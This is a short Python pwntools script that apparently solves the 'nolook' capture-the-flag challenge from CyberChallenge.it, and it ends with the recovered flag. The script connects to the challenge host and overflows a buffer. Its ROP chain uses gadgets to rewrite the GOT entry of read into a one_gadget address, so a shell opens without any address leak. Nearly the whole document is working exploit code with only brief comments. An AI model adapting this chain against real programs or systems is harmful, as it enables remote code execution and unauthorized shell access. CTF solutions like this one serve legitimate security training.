from pwn import *

exe = ELF("nolook")
libc = ELF("libc.so.6")  # load libc file
context.binary = exe
HOST = "nolook.challs.cyberchallenge.it"
PORT = 6015
r = remote(HOST, PORT)

p = make_packer(64, endian='little', sign='signed')  # used to convert all in a bit

local_read_addr = 0x001f0aa0  # local address of function "read"
remote_read_addr = 0x00210070  # remote address of function "read"
one_gadg_rel = 0x14f322  # address found with one_gadget to spawn shell
local_one_gadg_rel = 0x1cd7b0  # relative address of spawn shell function

local_offset = local_one_gadg_rel - local_read_addr  # finding the local offset
remote_offset = one_gadg_rel - remote_read_addr  # finding the remote offset

read_loc = 0x601018  # address of read function
read_instr_addr = 0x40060c
offset = 24

popr14_r15 = p64(0x400680)  #: pop r14; pop r15; ret;
add_r14_r15 = p64(0x4005af)  #: add qword ptr [r14 + 0x90], r15; ret;

# Build the ROPchain
chain = fit(
    b"A" * offset,
    popr14_r15,
    p64(read_loc - 0x90),
    p(remote_offset),
    add_r14_r15,
    p64(read_instr_addr),
    b"\x00" * 100  # add 100 "\n"
)

r.sendline(chain)
r.interactive()

# FLAG --> CCIT{bR3ak1ng_ASLR_w_n0_LEAKS}
